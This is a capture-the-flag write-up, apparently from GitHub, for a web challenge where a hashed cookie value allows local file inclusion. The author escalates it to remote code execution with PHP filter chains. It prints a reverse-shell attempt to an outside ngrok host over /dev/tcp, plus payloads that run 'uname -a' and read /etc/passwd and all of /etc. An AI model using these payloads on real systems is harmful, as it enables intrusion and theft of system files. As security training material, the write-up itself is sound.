Challenge Name: Hack if u can

Challenge Description: Find the RCE to get access to the system

The goal is to get an RCE.

First thing, when you open the website, website there is nothing useful. I try to do fuzzing; I find a robots.txt and nothing useful, and I search for an for an exploit for the server Vesrion nginx 1.25.2, and the same thing is not useful.

![image](https://github.com/user-attachments/assets/ba835251-3fa5-4720-8e3e-c2b8cec71630)

After digging in the website i found two usefull dir robots.txt and policy.php when you access the robots.txt this is the content

Robots.txt:

![image](https://github.com/user-attachments/assets/159d97e2-b71f-4a2e-831a-8727fa3b3631)

Now we know where is the flag file

Then when try to access the policy.php there is a cookie called read have an md5hash end with .txt i try to decrypt it i and i got this

![image](https://github.com/user-attachments/assets/0e97a5c7-846f-4335-980c-2fe2332fa201)

read:b204217b677944e7c8d2a12c670b5467.txt

After decrypting it

read:myfile.txt

I noticed what happens if i put the flag file directly in the cookie,and this is the output:

![image](https://github.com/user-attachments/assets/77c84997-6bb6-47bb-ace4-0c60f36a60d2)

Then i try to read the /etc/password and it's work then i try to do php wrapper and it work

![image](https://github.com/user-attachments/assets/aa78ef2d-9814-4e6b-bdc0-cd3425e7361e)

Now let's make lfi2rce i use this tool php_filter_chain_generator for this step

First i try to read the phpinfo(); and it's work 
![image](https://github.com/user-attachments/assets/6d681caa-86cf-401a-a502-863bf5f878c5)

Then i try to make a rev shell like this ```python php_filter_chain_generator.py --chain '& /dev/tcp/6.tcp.eu.ngrok.io/14246 0>&1") ?>'```

but when i try it did not work becuse it's vary large payload

i try to run tThenhe command directly like that php_filter_chain_generator.py --chain '<?php system("uname -a");?>' 

![image](https://github.com/user-attachments/assets/9e8f4006-f965-40df-95f0-503971e9661e)

Then i try to read all the file of the /etc/ dir i try this payload python php_filter_chain_generator.py --chain '<?php system("cat /etc/*");?>'

![Screenshot 2024-09-25 155901](https://github.com/user-attachments/assets/6c29cfce-050b-4e53-bb4b-aefdbc4fc308)

Finaly i read the flag file

